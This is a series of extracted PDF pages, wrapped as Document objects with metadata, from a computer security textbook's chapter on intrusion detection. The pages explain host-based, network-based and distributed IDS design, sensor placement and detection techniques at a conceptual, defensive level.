       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 286, 'page_label': '285'}, page_content='8.4 / HosT -BAsED InTRusIon DETECTIon  285\\nThe\\xa0disadvantages are that the audit records may not contain the needed infor-\\nmation or may not contain it in a convenient form, and that intruders may \\nattempt to manipulate these records to hide their actions.\\n• File integrity checksums:  A common approach to detecting intruder activity \\non a system is to periodically scan critical files for changes from the desired \\nbaseline, by comparing a current cryptographic checksums for these files, with \\na record of known good values. Disadvantages include the need to generate and \\nprotect the checksums using known good files, and the difficulty monitoring \\nchanging files. Tripwire is a well-known system using this approach.\\n• Registry access: An approach used on Windows systems is to monitor access \\nto the registry, given the amount of information and access to it used by pro -\\ngrams on these systems. However, this source is very Windows specific, and has \\nrecorded limited success.\\nThe sensor gathers data from the chosen source, filters the gathered data to \\nremove any unwanted information and to standardize the information format, and \\nforwards the result to the IDS analyzer, which may be local or remote.\\nAnomaly HIDS\\nThe majority of work on anomaly-based HIDS has been done on UNIX and Linux \\nsystems, given the ease of gathering suitable data for this work. While some earlier \\nwork used audit or accounting records, the majority is based on system call traces. \\nSystem calls are the means by which programs access core kernel functions, provid-\\ning a wide range of interactions with the low-level operating system functions. Hence \\nthey provide detailed information on process activity that can be used to classify it as \\nnormal or anomalous. Table 8.2a lists the system calls used in current Ubuntu Linux \\nsystems as an example. This data is typically gathered using an OS hook, such as the \\nBSM audit module. Most modern operating systems have highly reliable options for \\ncollecting this type of information.\\nThe system call traces are then analyzed by a suitable decision engine. [CREE13] \\nnotes that the original work by Forrest et al. introduced the Sequence Time-Delay \\nEmbedding (STIDE) algorithm, based on artificial immune system approaches, that \\ncompares observed sequences of system calls with sequences from the training phase \\nto obtain a mismatch ratio that determines whether the sequence is normal or not. \\nLater work has used alternatives, such as Hidden Markov Models (HMM), Artificial \\nNeural Networks (ANN), Support Vector Machines (SVM), or Extreme Learning \\nMachines (ELM) to make this classification.\\n[CREE13] notes that these approaches all report providing reasonable intruder \\ndetection rates of 95–99% while having false positive rates of less than 5%, though \\non older test datasets. He updates these results using recent contemporary data and \\nexample attacks, with a more extensive feature extraction process from the system \\ncall traces and an ELM decision engine capable of a very high detection rate while \\nmaintaining reasonable false positive rates. This approach should lead to even more \\neffective production HIDS products in the near future.\\nWindows systems have traditionally not used anomaly-based HIDS, as the \\nwide usage of Dynamic Link Libraries (DLLs) as an intermediary between  process \\nrequests for operating system functions and the actual system call interface has \\nM08_STAL0611_04_GE_C08.indd   285 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 287, 'page_label': '286'}, page_content='286  CHAPTER 8 / InTRusIon DETECTIon\\nhindered the effective use of system call traces to classify process behavior. Some \\nwork was done using either audit log entries, or registry file updates as a data source, \\nbut neither approach was very successful. [CREE13] reports a new approach that \\nuses traces of key DLL function calls as an alternative data source, with results com-\\nparable to that found with Linux system call trace HIDS. Table 8.2b lists the key \\nDLLs and executables monitored. Note that all of the distinct functions within these \\nDLLs, numbering in their thousands, are monitored, forming the equivalent to the \\nsystem call list presented in Table 8.2a. The adoption of this approach should lead \\nto the development of more effective Windows HIDS, capable of detecting zero-day \\nattacks, unlike the current generation of signature and heuristic Windows HIDS that \\nwe will discuss later.\\nWhile using system call traces provides arguably the richest information source \\nfor a HIDS, it does impose a moderate load on the monitored system to gather and \\nclassify this data. And as we noted earlier, the training phase for many of the decision \\nengines requires very significant time and computational resources. Hence, others \\nhave trialed approaches based on audit (log) records. However, these both have a \\nlower detection rate than the system call trace approaches (80% reported), and are \\nmore susceptible to intruder manipulation.\\n(a) Ubuntu Linux System Calls\\naccept, access, acct, adjtime, aiocancel, aioread, aiowait, aiowrite, alarm, async_daemon, auditsys, \\nbind, chdir, chmod, chown, chroot, close, connect, creat, dup, dup2, execv, execve, exit, exportfs, \\n fchdir, fchmod, fchown, fchroot, fcntl, flock, fork, fpathconf, fstat, fstat, fstatfs, fsync, ftime, ftruncate, \\ngetdents, getdirentries, getdomainname, getdopt, getdtablesize, getfh, getgid, getgroups, gethostid, \\ngethostname, getitimer, getmsg, getpagesize, getpeername, getpgrp, getpid, getpriority, getrlimit, \\n getrusage, getsockname, getsockopt, gettimeofday, getuid, gtty, ioctl, kill, killpg, link, listen, lseek, \\nlstat, madvise, mctl, mincore, mkdir, mknod, mmap, mount, mount, mprotect, mpxchan, msgsys, \\nmsync, munmap, nfs_mount, nfssvc, nice, open, pathconf, pause, pcfs_mount, phys, pipe, poll,  profil, \\nptrace, putmsg, quota, quotactl, read, readlink, readv, reboot, recv, recvfrom, recvmsg, rename, \\nresuba, rfssys, rmdir, sbreak, sbrk, select, semsys, send, sendmsg, sendto, setdomainname, setdopt, \\nsetgid, setgroups, sethostid, sethostname, setitimer, setpgid, setpgrp, setpgrp, setpriority, setquota, \\nsetregid, setreuid, setrlimit, setsid, setsockopt, settimeofday, setuid, shmsys, shutdown, sigblock, \\n sigpause, sigpending, sigsetmask, sigstack, sigsys, sigvec, socket, socketaddr, socketpair, sstk, stat, stat, \\nstatfs, stime, stty, swapon, symlink, sync, sysconf, time, times, truncate, umask, umount, uname, unlink, \\nunmount, ustat, utime, utimes, vadvise, vfork, vhangup, vlimit, vpixsys, vread, vtimes, vtrace, vwrite, \\nwait, wait3, wait4, write, writev\\n(b) Key Windows DLLs and Executables\\ncomctl32\\nkernel32\\nmsvcpp\\nmsvcrt\\nmswsock\\nntdll\\nntoskrnl\\nuser32\\nws2_32\\nTable 8.2 Linux System Calls and Windows DLLs Monitored\\nM08_STAL0611_04_GE_C08.indd   286 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 288, 'page_label': '287'}, page_content='8.4 / HosT -BAsED InTRusIon DETECTIon  287\\nA further alternative to examining current process behavior is to look for \\nchanges to important files on the monitored host. This uses a cryptographic check -\\nsum to check for any changes from the known good baseline for the monitored files. \\nTypically, all program binaries, scripts, and configuration files are monitored, either \\non each access, or on a periodic scan of the file system. The tripwire system is a \\nwidely used implementation of this approach, and is available for all major operat -\\ning systems including Linux, Mac OS, and Windows. This approach is very  sensitive \\nto changes in the monitored files , as a result of intruder activity or for any other \\nreason. However, it cannot detect changes made to processes once they are running \\non the system. Other difficulties include determining which files to monitor, since a \\nsurprising number of files change in an operational system, having access to a known \\ngood copy of each monitored file to establish the baseline value, and protecting the \\ndatabase of file signatures.\\nSignature or Heuristic HIDS\\nThe alternative of signature or heuristic-based HIDS is widely used, particularly as \\nseen in anti virus (A/V), more correctly viewed as anti malware, products. These are \\nvery commonly used on client systems and increasingly on mobile devices, and also \\nincorporated into mail and Web application proxies on firewalls and in  network-based \\nIDSs. They use either a database of file signatures, which are patterns of data found \\nin known malicious software, or heuristic rules that characterize known malicious \\nbehavior.\\nThese products are quite efficient at detecting known malware, however they \\nare not capable of detecting zero-day attacks that do not correspond to the known \\nsignatures or heuristic rules. They are widely used, particularly on Windows systems, \\nwhich continue to be targeted by intruders, as we discussed in Section 6.9.\\nDistributed HIDS\\nTraditionally, work on host-based IDSs focused on single-system stand-alone opera-\\ntion. The typical organization, however, needs to defend a distributed collection of \\nhosts supported by a LAN or internetwork. Although it is possible to mount a defense \\nby using stand-alone IDSs on each host, a more effective defense can be achieved by \\ncoordination and cooperation among IDSs across the network.\\nPorras points out the following major issues in the design of a distributed IDS \\n[PORR92]:\\n• A distributed IDS may need to deal with dif ferent sensor data formats. In a \\nheterogeneous environment, different systems may use different sensors and \\napproaches to gathering data for intrusion detection use.\\n• One or more nodes in the network will serve as collection and analysis points \\nfor the data from the systems on the network. Thus, either raw sensor data or \\nsummary data must be transmitted across the network. Therefore, there is a \\nrequirement to assure the integrity and confidentiality of these data. Integrity \\nis required to prevent an intruder from masking his or her activities by alter -\\ning the transmitted audit information. Confidentiality is required because the \\ntransmitted audit information could be valuable.\\nM08_STAL0611_04_GE_C08.indd   287 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 289, 'page_label': '288'}, page_content='288  CHAPTER 8 / InTRusIon DETECTIon\\n• Either a centralized or decentralized architecture can be used. With a central-\\nized architecture, there is a single central point of collection and analysis of all \\nsensor data. This eases the task of correlating incoming reports but creates a \\npotential bottleneck and single point of failure. With a decentralized architec-\\nture, there is more than one analysis center, but these must coordinate their \\nactivities and exchange information.\\nA good example of a distributed IDS is one developed at the University of \\n California at Davis [HEBE92, SNAP91]; a similar approach has been taken for a \\nproject at Purdue University [SPAF00, BALA98]. Figure 8.2 shows the overall archi-\\ntecture, which consists of three main components:\\n1. Host agent module:  An audit collection module operating as a background \\nprocess on a monitored system. Its purpose is to collect data on security-related \\nevents on the host and transmit these to the central manager. Figure 8.3 shows \\ndetails of the agent module architecture.\\n2. LAN monitor agent module: Operates in the same fashion as a host agent module \\nexcept that it analyzes LAN traffic and reports the results to the central manager.\\n3. Central manager module: Receives reports from LAN monitor and host agents \\nand processes and correlates these reports to detect intrusion.\\nThe scheme is designed to be independent of any operating system or system \\nauditing implementation. Figure 8.3 shows the general approach that is taken. The \\nagent captures each audit record produced by the native audit collection system. \\nA\\xa0filter is applied that retains only those records that are of security interest. These \\nrecords are then reformatted into a standardized format referred to as the host \\nFigure 8.2 Architecture for Distributed Intrusion Detection\\nCentral manager\\nLAN monitor Host Host\\nAgent\\nmodule\\nRouter\\nInternet\\nManager\\nmodule\\nM08_STAL0611_04_GE_C08.indd   288 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 290, 'page_label': '289'}, page_content='8.5 / nETWoRK-BAsED InTRusIon DETECTIon  289\\naudit record (HAR). Next, a template-driven logic module analyzes the records for \\nsuspicious activity. At the lowest level, the agent scans for notable events that are \\nof interest independent of any past events. Examples include failed files, accessing \\nsystem files, and changing a file’s access control. At the next higher level, the agent \\nlooks for sequences of events, such as known attack patterns (signatures). Finally, \\nthe agent looks for anomalous behavior of an individual user based on a historical \\nprofile of that user, such as number of programs executed, number of files accessed, \\nand the like.\\nWhen suspicious activity is detected, an alert is sent to the central manager. The \\ncentral manager includes an expert system that can draw inferences from received \\ndata. The manager may also query individual systems for copies of HARs to correlate \\nwith those from other agents.\\nThe LAN monitor agent also supplies information to the central manager. The \\nLAN monitor agent audits host-host connections, services used, and volume of traffic. \\nIt searches for significant events, such as sudden changes in network load, the use of \\nsecurity-related services, and suspicious network activities.\\nThe architecture depicted in Figures 8.2 and 8.3 is quite general and flexible. \\nIt offers a foundation for a machine-independent approach that can expand from \\nstand-alone intrusion detection to a system that is able to correlate activity from \\na number of sites and networks to detect suspicious activity that would otherwise \\nremain undetected.\\n 8.5 NETWORK-BASED INTRUSION DETECTION\\nA network-based IDS (NIDS) monitors traffic at selected points on a network or \\ninterconnected set of networks. The NIDS examines the traffic packet by packet in \\nreal time, or close to real time, to attempt to detect intrusion patterns. The NIDS \\nmay examine network-, transport-, and/or application-level protocol activity. Note \\nthe contrast with a host-based IDS; a NIDS examines packet traffic directed toward \\nFigure 8.3 Agent Architecture\\nOS audit\\ninformation\\nAlerts\\nModif  ications\\nQuery/\\nresponse\\nNotable\\nactivity;\\nsignatures;\\nnoteworthy\\nsessions\\nHost audit record (HAR)\\nFilter for\\nsecurity\\ninterest\\nReformat\\nfunction\\nOS audit\\nfunction\\nAnalysis\\nmodule\\nTemplates\\nCentral\\nmanager\\nLogic\\nmodule\\nM08_STAL0611_04_GE_C08.indd   289 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 291, 'page_label': '290'}, page_content='290  CHAPTER 8 / InTRusIon DETECTIon\\npotentially vulnerable computer systems on a network. A host-based system exam -\\nines user and software activity on a host.\\nNIDS are typically included in the perimeter security infrastructure of an \\norganization, either incorporated into, or associated with, the firewall. They typi -\\ncally focus on monitoring for external intrusion attempts, by analyzing both traffic \\npatterns and traffic content for malicious activity. With the increasing use of encryp-\\ntion though, NIDS have lost access to significant content, hindering their ability to \\nfunction well. Thus, while they have an important role to play, they can only form \\npart of the solution. A typical NIDS facility includes a number of sensors to moni -\\ntor packet traffic, one or more servers for NIDS management functions, and one or \\nmore management consoles for the human interface. The analysis of traffic patterns \\nto detect intrusions may be done at the sensor, at the management server, or some \\ncombination of the two.\\nTypes of Network Sensors\\nSensors can be deployed in one of two modes: inline and passive. An inline sensor is \\ninserted into a network segment so the traffic that it is monitoring must pass through \\nthe sensor. One way to achieve an inline sensor is to combine NIDS sensor logic \\nwith another network device, such as a firewall or a LAN switch. This approach has \\nthe advantage that no additional separate hardware devices are needed; all that is \\nrequired is NIDS sensor software. An alternative is a stand-alone inline NIDS sen -\\nsor. The primary motivation for the use of inline sensors is to enable them to block \\nan attack when one is detected. In this case, the device is performing both intrusion \\ndetection and intrusion prevention functions.\\nMore commonly, passive sensors  are used. A passive sensor monitors a copy \\nof network traffic; the actual traffic does not pass through the device. From the \\npoint of view of traffic flow, the passive sensor is more efficient than the inline \\nsensor, because it does not add an extra handling step that contributes to packet \\ndelay.\\nFigure 8.4 illustrates a typical passive sensor configuration. The sensor connects \\nto the network transmission medium, such as a fiber optic cable, by a direct physical \\ntap. The tap provides the sensor with a copy of all network traffic being carried by \\nthe medium. The network interface card (NIC) for this tap usually does not have \\nan IP address configured for it. All traffic into this NIC is simply collected with no \\nprotocol interaction with the network. The sensor has a second NIC that connects to \\nthe network with an IP address and enables the sensor to communicate with a NIDS \\nmanagement server.\\nAnother distinction is whether the sensor is monitoring a wired or wireless \\nnetwork. A wireless network sensor may either be inline, incorporated into a wireless \\naccess point (AP), or a passive wireless traffic monitor. Only these sensors can gather \\nand analyze wireless protocol traffic, and hence detect attacks against those protocols. \\nSuch attacks include wireless denial-of-service, session hijack, or AP impersonation. \\nA NIDS focussed exclusively on a wireless network is known as a Wireless IDS \\n(WIDS). Alternatively, wireless sensors may be a component of a more general NIDS \\ngathering data from both wired and wireless network traffic, or even of a distributed \\nIDS combining host and network sensor data.\\nM08_STAL0611_04_GE_C08.indd   290 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 292, 'page_label': '291'}, page_content='8.5 / nETWoRK-BAsED InTRusIon DETECTIon  291\\nNIDS Sensor Deployment\\nConsider an organization with multiple sites, each of which has one or more LANs, with \\nall of the networks interconnected via the Internet or some other WAN technology. For \\na comprehensive NIDS strategy, one or more sensors are needed at each site. Within a \\nsingle site, a key decision for the security administrator is the placement of the sensors.\\nFigure 8.5 illustrates a number of possibilities. In general terms, this configura-\\ntion is typical of larger organizations. All Internet traffic passes through an external \\nfirewall that protects the entire facility.2 Traffic from the outside world, such as cus-\\ntomers and vendors that need access to public services, such as Web and mail, is \\nmonitored. The external firewall also provides a degree of protection for those parts \\nof the network that should only be accessible by users from other corporate sites. \\nInternal firewalls may also be used to provide more specific protection to certain \\nparts of the network.\\nA common location for a NIDS sensor is just inside the external firewall \\n (location 1 in the figure). This position has a number of advantages:\\n• Sees attacks, originating from the outside world, that penetrate the network’s \\nperimeter defenses (external firewall).\\n• Highlights problems with the network firewall policy or performance.\\n• Sees attacks that might target the Web server or ftp server.\\n• Even if the incoming attack is not recognized, the IDS can sometimes recognize \\nthe outgoing traffic that results from the compromised server.\\n2Firewalls will be discussed in detail in Chapter 9. In essence, a firewall is designed to protect one or a \\nconnected set of networks on the inside of the firewall from Internet and other traffic from outside the \\nfirewall. The firewall does this by restricting traffic, rejecting potentially threatening packets.\\nFigure 8.4 Passive NIDS Sensor\\nSource: Based on [CREM06].\\nNetwork traf f ic\\nMonitoring interface\\n(no IP, promiscuous mode)\\nManagement interface\\n(with IP)\\nNIDS\\nsensor\\nM08_STAL0611_04_GE_C08.indd   291 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 293, 'page_label': '292'}, page_content='292  CHAPTER 8 / InTRusIon DETECTIon\\nInstead of placing a NIDS sensor inside the external firewall, the security \\nadministrator may choose to place a NIDS sensor between the external firewall and \\nthe Internet or WAN (location 2). In this position, the sensor can monitor all network \\ntraffic, unfiltered. The advantages of this approach are as follows:\\n• Documents number of attacks originating on the Internet that target the network.\\n• Documents types of attacks originating on the Internet that target the network.\\nA sensor at location 2 has a higher processing burden than any sensor located \\nelsewhere on the site network.\\nIn addition to a sensor at the boundary of the network, on either side of the \\nexternal firewall, the administrator may configure a firewall and one or more  sensors \\nto protect major backbone networks, such as those that support internal servers \\nand\\xa0database resources (location 3). The benefits of this placement include the \\nfollowing:\\n• Monitors a large amount of a network’s traffic, thus increasing the possibility \\nof spotting attacks.\\n• Detects unauthorized activity by authorized users within the organization’s \\nsecurity perimeter.\\nThus, a sensor at location 3 is able to monitor for both internal and external \\nattacks. Because the sensor monitors traffic to only a subset of devices at the site, \\nit can be tuned to specific protocols and attack types, thus reducing the processing \\nburden.\\nFigure 8.5 Example of NIDS Sensor Deployment\\n4\\nInternal server\\nand data resource\\nnetworks\\nWorkstation\\nnetworks\\n3 LAN switch\\nor router\\nLAN switch\\nor router External\\nf irewall\\nInternet\\nService network\\n(Web, mail, DNS, etc.)\\nInternal\\nf irewall\\n1\\n2\\nLAN switch\\nor router\\nInternal\\nf irewall\\nM08_STAL0611_04_GE_C08.indd   292 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 294, 'page_label': '293'}, page_content='8.5 / nETWoRK-BAsED InTRusIon DETECTIon  293\\nFinally, the network facilities at a site may include separate LANs that sup -\\nport user workstations and servers specific to a single department. The administrator \\ncould configure a firewall and NIDS sensor to provide additional protection for all \\nof these networks or target the protection to critical subsystems, such as personnel \\nand financial networks (location 4). A sensor used in this latter fashion provides the \\nfollowing benefits:\\n• Detects attacks targeting critical systems and resources.\\n• Allows focusing of limited resources to the network assets considered of  greatest \\nvalue.\\nAs with a sensor at location 3, a sensor at location 4 can be tuned to specific \\nprotocols and attack types, thus reducing the processing burden.\\nIntrusion Detection Techniques\\nAs with host-based intrusion detection, network-based intrusion detection makes use \\nof signature detection and anomaly detection. Unlike the case with HIDS, a number \\nof commercial anomaly NIDS products are available [GARC09]. One of the best \\nknown is the Statistical Packet Anomaly Detection Engine (SPADE), available as a \\nplug-in for the Snort system that we will discuss later.\\nSignature Detection NIST SP 800-94 (Guide to Intrusion Detection and Preven-\\ntion Systems, July 2012) lists the following as examples of that types of attacks that \\nare suitable for signature detection:\\n• Application layer reconnaissance and attacks: Most NIDS technologies analyze \\nseveral dozen application protocols. Commonly analyzed ones include Dynamic \\nHost Configuration Protocol (DHCP), DNS, Finger, FTP , HTTP , Internet \\n Message Access Protocol (IMAP), Internet Relay Chat (IRC), Network File \\nSystem (NFS), Post Office Protocol (POP), rlogin/rsh, Remote Procedure Call \\n(RPC), Session Initiation Protocol (SIP), Server Message Block (SMB), SMTP , \\nSNMP , Telnet, and Trivial File Transfer Protocol (TFTP), as well as database \\nprotocols, instant messaging applications, and peer-to-peer file sharing soft -\\nware. The NIDS is looking for attack patterns that have been identified as tar-\\ngeting these protocols. Examples of attack include buffer overflows, password \\n guessing, and malware transmission.\\n• Transport layer reconnaissance and attacks: NIDSs analyze TCP and UDP traf-\\nfic and perhaps other transport layer protocols. Examples of attacks are unusual \\npacket fragmentation, scans for vulnerable ports, and TCP-specific attacks such \\nas SYN floods.\\n• Network layer reconnaissance and attacks: NIDSs typically analyze IPv4, IPv6, \\nICMP , and IGMP at this level. Examples of attacks are spoofed IP addresses \\nand illegal IP header values.\\n• Unexpected a pplication services:  The NIDS attempts to determine if the \\n activity on a transport connection is consistent with the expected application \\nprotocol. An example is a host running an unauthorized application service.\\n• Policy violations: Examples include use of inappropriate websites and use of \\nforbidden application protocols.\\nM08_STAL0611_04_GE_C08.indd   293 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 295, 'page_label': '294'}, page_content='294  CHAPTER 8 / InTRusIon DETECTIon\\nanomaly Detection techniqueS NIST SP 800-94 lists the following as examples \\nof the types of attacks that are suitable for anomaly detection:\\n• Denial-of-service (DoS) attacks:  Such attacks involve either significantly \\nincreased packet traffic or significantly increase connection attempts, in an \\nattempt to overwhelm the target system. These attacks are analyzed in  Chapter\\xa07. \\nAnomaly detection is well-suited to such attacks.\\n• Scanning: A scanning attack occurs when an attacker probes a target network \\nor system by sending different kinds of packets. Using the responses received \\nfrom the target, the attacker can learn many of the system’s characteristics and \\nvulnerabilities. Thus, a scanning attack acts as a target identification tool for an \\nattacker. Scanning can be detected by atypical flow patterns at the application \\nlayer (e.g., banner grabbing3), transport layer (e.g., TCP and UDP port scan -\\nning), and network layer (e.g., ICMP scanning).\\n• Worms: Worms4 spreading among hosts can be detected in more than one way. \\nSome worms propagate quickly and use large amounts of bandwidth. Worms \\ncan also be detected because they can cause hosts to communicate with each \\nother that typically do not, and they can also cause hosts to use ports that they \\nnormally do not use. Many worms also perform scanning. Chapter 6 discusses \\nworms in detail.\\nStateful Protocol analySiS (SPa) NIST SP 800-94 details this subset of anom-\\naly detection that compares observed network traffic against predetermined universal \\nvendor supplied profiles of benign protocol traffic. This distinguishes it from anomaly \\ntechniques trained with organization specific traffic profiles. SPA understands and \\ntracks network, transport, and application protocol states to ensure they progress as \\nexpected. A key disadvantage of SPA is the high resource use it requires.\\nLogging of Alerts\\nWhen a sensor detects a potential violation, it sends an alert and logs information \\nrelated to the event. The NIDS analysis module can use this information to refine \\nintrusion detection parameters and algorithms. The security administrator can use \\nthis information to design prevention techniques. Typical information logged by a \\nNIDS sensor includes the following:\\n• Timestamp (usually date and time)\\n• Connection or session ID (typically a consecutive or unique number assigned to \\neach TCP connection or to like groups of packets for connectionless protocols)\\n• Event or alert type\\n3Typically, banner grabbing consists of initiating a connection to a network server and recording the data \\nthat is returned at the beginning of the session. This information can specify the name of the application, \\nversion number, and even the operating system that is running the server [DAMR03].\\n4A worm is a program that can replicate itself and send copies from computer to computer across network \\nconnections. Upon arrival, the worm may be activated to replicate and propagate again. In addition to \\npropagation, the worm usually performs some unwanted function.\\nM08_STAL0611_04_GE_C08.indd   294 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 296, 'page_label': '295'}, page_content='8.6 / DIsTRIBuTED oR HYBRID InTRusIon DETECTIon  295\\n• Rating (e.g., priority, severity, impact, confidence)\\n• Network, transport, and application layer protocols\\n• Source and destination IP addresses\\n• Source and destination TCP or UDP ports, or ICMP types and codes\\n• Number of bytes transmitted over the connection\\n• Decoded payload data, such as application requests and responses\\n• State-related information (e.g., authenticated username)\\n 8.6 DISTRIBUTED OR HYBRID INTRUSION DETECTION\\nIn recent years, the concept of communicating IDSs has evolved to schemes that \\ninvolve distributed systems that cooperate to identify intrusions and to adapt to \\nchanging attack profiles. These combine in a central IDS, the complementary infor-\\nmation sources used by HIDS with host-based process and data details, and NIDS \\nwith network events and data, to manage and coordinate intrusion detection and \\nresponse in an organization’s IT infrastructure. Two key problems have always con-\\nfronted systems such as IDSs, firewalls, virus and worm detectors, and so on. First, \\nthese tools may not recognize new threats or radical modifications of existing threats. \\nAnd second, it is difficult to update schemes rapidly enough to deal with quickly \\nspreading attacks. A separate problem for perimeter defenses, such as firewalls, is that \\nthe modern enterprise has loosely defined boundaries, and hosts are generally able \\nto move in and out. Examples are hosts that communicate using wireless technology \\nand employee laptops that can be plugged into network ports.\\nAttackers have exploited these problems in several ways. The more traditional \\nattack approach is to develop worms and other malicious software that spreads ever \\nmore rapidly and to develop other attacks (such as DoS attacks) that strike with \\noverwhelming force before a defense can be mounted. This style of attack is still \\nprevalent. But more recently, attackers have added a quite different approach: Slow \\nthe spread of the attack so it will be more difficult to detect by conventional algo -\\nrithms [ANTH07].\\nA way to counter such attacks is to develop cooperated systems that can rec -\\nognize attacks based on more subtle clues then adapt quickly. In this approach, \\nanomaly detectors at local nodes look for evidence of unusual activity. For example, \\na machine that normally makes just a few network connections might suspect that \\nan attack is under way if it is suddenly instructed to make connections at a higher \\nrate. With only this evidence, the local system risks a false positive if it reacts to the \\nsuspected attack (say by disconnecting from the network and issuing an alert) but \\nit risks a false negative if it ignores the attack or waits for further evidence. In an \\nadaptive, cooperative system, the local node instead uses a peer-to-peer “gossip” \\nprotocol to inform other machines of its suspicion, in the form of a probability that \\nthe network is under attack. If a machine receives enough of these messages so a \\nthreshold is exceeded, the machine assumes an attack is under way and responds. \\nThe machine may respond locally to defend itself and also send an alert to a central  \\nsystem.\\nM08_STAL0611_04_GE_C08.indd   295 10/11/17   2:55 PM\\nhttps://sanet.st/blogs/polatebooks'),\n",
